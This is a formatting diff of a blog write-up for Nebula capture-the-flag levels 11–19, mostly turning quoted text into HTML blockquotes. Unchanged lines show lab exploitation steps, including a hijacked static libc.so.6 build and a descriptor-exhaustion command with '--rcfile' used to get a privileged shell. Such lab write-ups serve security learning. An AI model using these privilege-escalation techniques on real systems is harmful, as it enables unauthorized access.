@@ -58,10 +58,11 @@ up the process both for other's benefit if they get stuck, and also as
 a sort of diary for myself, so I can refer back to any info if I need to.</p>
 <p>This continues on from <a class="reference external" href="http://unlogic.co.uk/2014/06/24/cracking-nebula-part1/">part 1</a>.</p>
 <div class="section" id="level-11">
-<h2>Level 11 ##</h2>
-<p>&gt; The /home/flag11/flag11 binary processes standard input and executes a shell command.
-&gt;
-&gt; There are two ways of completing this level, you may wish to do both :-)</p>
+<h2>Level 11</h2>
+<blockquote>
+<p>The /home/flag11/flag11 binary processes standard input and executes a shell command.</p>
+<p>There are two ways of completing this level, you may wish to do both :-)</p>
+</blockquote>
 <pre class="code C literal-block">
 <span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
 #include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
@@ -169,8 +170,9 @@ a sort of diary for myself, so I can refer back to any info if I need to.</p>
 <p>I'll be honest with you and admit that I had a lot of trouble with this. I eventually looked up how to do this on other blogs, but still couldn't get it to work. After some searching I believe it's down to the bash version my VM is running. The exploit was possible due to some feature in older versions of bash, but not in the version I have. If you would like to read how to get level 11 you can do so here: <a class="reference external" href="http://www.kroosec.com/2012/11/nebula-level11.html">http://www.kroosec.com/2012/11/nebula-level11.html</a></p>
 </div>
 <div class="section" id="level-12">
-<h2>level 12 ##</h2>
-<p>&gt; There is a backdoor process listening on port 50001.</p>
+<h2>level 12</h2>
+<blockquote>
+There is a backdoor process listening on port 50001.</blockquote>
 <pre class="code C literal-block">
 <span class="n">local</span> <span class="n">socket</span> <span class="o">=</span> <span class="n">require</span><span class="p">(</span><span class="s">&quot;socket&quot;</span><span class="p">)</span>
 <span class="n">local</span> <span class="n">server</span> <span class="o">=</span> <span class="n">assert</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">bind</span><span class="p">(</span><span class="s">&quot;127.0.0.1&quot;</span><span class="p">,</span> <span class="mi">50001</span><span class="p">))</span>
@@ -216,8 +218,9 @@ Better luck next time
 </pre>
 </div>
 <div class="section" id="level-13">
-<h2>Level 13 ##</h2>
-<p>&gt; There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.</p>
+<h2>Level 13</h2>
+<blockquote>
+There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.</blockquote>
 <pre class="code C literal-block">
 <span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
 #include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
@@ -282,9 +285,9 @@ library we are trying to preload.</p>
 </pre>
 </div>
 <div class="section" id="level-14">
-<h2>Level 14 ##</h2>
+<h2>Level 14</h2>
 <blockquote>
-&gt; This program resides in /home/flag14/flag14 . It encrypts input and writes it to standard output. An encrypted token file is also in that home directory, decrypt it :)</blockquote>
+This program resides in /home/flag14/flag14 . It encrypts input and writes it to standard output. An encrypted token file is also in that home directory, decrypt it :)</blockquote>
 <p>The contents of <code>token</code> were encrypted using the <code>flag14</code> binary in <code>~flag14</code>. If you run it you can see how it works. Let's enter something and see if we can work out how it works. I created a file with the contents <code>abcdefghijklmno</code> in <code>/tmp/test</code></p>
 <pre class="code console literal-block">
 <span class="go"> level14&#64;nebula:/home/flag14$ cat /tmp/test | ./flag14 -e
@@ -323,12 +326,12 @@ flag14&#64;localhost's password: 8457c118-887c-4e40-a5a6-33a25353165
 </pre>
 </div>
 <div class="section" id="level-15">
-<h2>Level 15 ##</h2>
-<p>&gt; strace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary.
-&gt;
-&gt; You may wish to review how to &quot;compile a shared library in linux&quot; and how the libraries are loaded and processed by reviewing the dlopen manpage in depth.
-&gt;
-&gt; Clean up after yourself :)</p>
+<h2>Level 15</h2>
+<blockquote>
+<p>strace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary.</p>
+<p>You may wish to review how to &quot;compile a shared library in linux&quot; and how the libraries are loaded and processed by reviewing the dlopen manpage in depth.</p>
+<p>Clean up after yourself :)</p>
+</blockquote>
 <p>After running <code>strace</code> we notice this particular bit</p>
 <pre class="code console literal-block">
 <span class="gp">level15&#64;nebula:/home/flag15$</span> strace ./flag15
@@ -416,10 +419,14 @@ OFFSET   TYPE              VALUE
 <span class="go">/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol system, version GLIBC_2.0 not defined in file libc.so.6 with link time reference</span>
 </pre>
 <p><em>sigh</em> - symbol <code>system</code> is missing. Ok, let's just build it statically and wrap it all up so we've got everything we need. From <code>man gcc</code></p>
-<p>&gt; <strong>-static-libgcc</strong>
-&gt;           On systems that provide libgcc as a shared library, these options force the use of either the shared or
-&gt;           static version respectively.  If no shared version of libgcc
-&gt;           was built when the compiler was configured, these options have no effect.</p>
+<blockquote>
+<dl class="docutils">
+<dt><strong>-static-libgcc</strong></dt>
+<dd>On systems that provide libgcc as a shared library, these options force the use of either the shared or
+static version respectively.  If no shared version of libgcc
+was built when the compiler was configured, these options have no effect.</dd>
+</dl>
+</blockquote>
 <p>So really we can also get rid of our implementation of <code>__cxa_finalize</code> as it's all statically linked now.</p>
 <pre class="code console literal-block">
 <span class="gp">level15&#64;nebula:/var/tmp/flag15$</span> gcc -fPIC -shared -static-libgcc -Wl,--version-script<span class="o">=</span>version,-Bstatic -o libc.so.6 mylibc.c
@@ -431,8 +438,9 @@ OFFSET   TYPE              VALUE
 </pre>
 </div>
 <div class="section" id="level-16">
-<h2>Level 16 ##</h2>
-<p>&gt; There is a perl script running on port 1616.</p>
+<h2>Level 16</h2>
+<blockquote>
+There is a perl script running on port 1616.</blockquote>
 <pre class="code perl literal-block">
 <span class="ch">#!/usr/bin/env perl</span>
 
@@ -505,8 +513,9 @@ flag16</span>
 </pre>
 </div>
 <div class="section" id="level-17">
-<h2>Level 17 ##</h2>
-<p>&gt; There is a python script listening on port 10007 that contains a vulnerability.</p>
+<h2>Level 17</h2>
+<blockquote>
+There is a python script listening on port 10007 that contains a vulnerability.</blockquote>
 <pre class="code python literal-block">
 <span class="ch">#!/usr/bin/python</span>
 
@@ -569,8 +578,9 @@ flag16</span>
 </pre>
 </div>
 <div class="section" id="level-18">
-<h2>Level 18 ##</h2>
-<p>&gt; Analyse the C program, and look for vulnerabilities in the program. There is an easy way to solve this level, an intermediate way to solve it, and a more difficult/unreliable way to solve it.</p>
+<h2>Level 18</h2>
+<blockquote>
+Analyse the C program, and look for vulnerabilities in the program. There is an easy way to solve this level, an intermediate way to solve it, and a more difficult/unreliable way to solve it.</blockquote>
 <pre class="code C literal-block">
 <span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
 #include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
@@ -815,12 +825,13 @@ Shell options:
 <p>Right, so we need to remember that we're running <code>sh</code> here, and our arguments
 are being passed to it. Unfortunately <code>-d</code> and such are not valid here.
 Time to read the manual....</p>
-<p>&gt; <strong>--rcfile file</strong>
-&gt;
-&gt; Execute commands from file instead of the system wide
-&gt; initialization file /etc/bash.bashrc and the standard personal
-&gt; initialization file ~/.bashrc if the shell is interactive
-&gt; (see INVOCATION below).</p>
+<blockquote>
+<p><strong>--rcfile file</strong></p>
+<p>Execute commands from file instead of the system wide
+initialization file /etc/bash.bashrc and the standard personal
+initialization file ~/.bashrc if the shell is interactive
+(see INVOCATION below).</p>
+</blockquote>
 <p>Ok, well, it's worth a shot.</p>
 <pre class="code console literal-block">
 <span class="gp">level18&#64;nebula:/home/flag18$</span> python -c <span class="s2">&quot;print('login me\n'*1021 + 'closelog\n' + 'shell')&quot;</span> <span class="p">|</span> ./flag18 --rcfile -d /tmp/flag18/debug
@@ -861,8 +872,9 @@ You have successfully executed getflag on a target account
 circumventing <cite>FORTIFY_SOURCE</cite> you can read <a class="reference external" href="http://phrack.org/issues/67/9.html">A Eulogy for Formatting Strings</a>. I'll be re-reading that for sure.</p>
 </div>
 <div class="section" id="flag-19">
-<h2>Flag 19 ##</h2>
-<p>&gt; There is a flaw in the below program in how it operates.</p>
+<h2>Flag 19</h2>
+<blockquote>
+There is a flaw in the below program in how it operates.</blockquote>
 <pre class="code C literal-block">
 <span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
 #include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
@@ -939,7 +951,7 @@ work.</p>
 <p><strong>Nebula done.</strong></p>
 </div>
 <div class="section" id="closing-words">
-<h2>Closing words ##</h2>
+<h2>Closing words</h2>
 <p>Firstly: Thanks for taking the time to read this. Please leave any feedback or
 comments below (or twitter/email if you prefer).</p>
 <p>Secondly: If you are here because you are also playing <em>Nebula</em> and are
